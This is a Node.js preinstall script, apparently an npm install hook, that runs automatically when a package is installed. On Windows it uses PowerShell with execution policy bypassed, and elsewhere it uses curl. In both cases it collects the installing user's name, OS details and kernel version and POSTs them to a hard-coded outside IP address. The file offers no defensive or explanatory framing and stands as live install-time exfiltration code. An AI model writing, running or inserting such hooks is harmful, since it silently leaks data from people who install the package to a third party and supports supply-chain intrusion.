// preinstall.js
const { execSync } = require('child_process');
const url = 'http://206.189.139.175:8080';

try {
  if (process.platform === 'win32') {
    // On Windows, use PowerShell.
    // Retrieve the current user, OS caption, and OS version,
    // then send them via Invoke-WebRequest to the remote URL.
    const psCommand =
      `& { ` +
      `$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name; ` +
      `$os = (Get-CimInstance Win32_OperatingSystem).Caption; ` +
      `$version = (Get-CimInstance Win32_OperatingSystem).Version; ` +
      `Invoke-WebRequest -Uri '${url}' -Method POST -Body "$user - $os - $version" ` +
      `}`;
    const winCmd = `powershell -ExecutionPolicy Bypass -NoProfile -Command "${psCommand}"`;
    // Execute and inherit stdio so that any output or errors are visible.
    execSync(winCmd, { stdio: 'inherit' });
  } else {
    // On Linux (or any non-Windows), use curl.
    // The command now sends the current user, full OS info, and kernel version.
    const linuxCmd = `curl -X POST -d "user=$(whoami)&os=$(uname -a)&kernel=$(uname -r)" ${url}`;
    execSync(linuxCmd, { stdio: 'inherit' });
  }
} catch (error) {
  console.error('Preinstall command failed:', error);
  process.exit(1);
}
